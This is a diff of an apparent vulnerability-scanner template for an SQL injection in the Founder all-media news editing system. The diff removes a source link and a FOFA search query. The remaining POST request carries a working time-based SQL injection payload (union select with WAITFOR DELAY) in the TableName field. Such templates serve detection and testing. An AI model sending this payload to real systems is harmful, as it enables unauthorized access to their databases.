@@ -3,12 +3,8 @@ info:
   name: 方正全媒体新闻采编系统-SQL注入-binary
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hczhmkuad2xmc4kn'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hczhmkuad2xmc4kn
-    fofa: body="/newsedit/newsedit/" || app="FOUNDER-全媒体采编系统"
 http:
 - raw:
   - 'POST /newsedit/newsplan/task/binary.do HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27%3Bselect+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
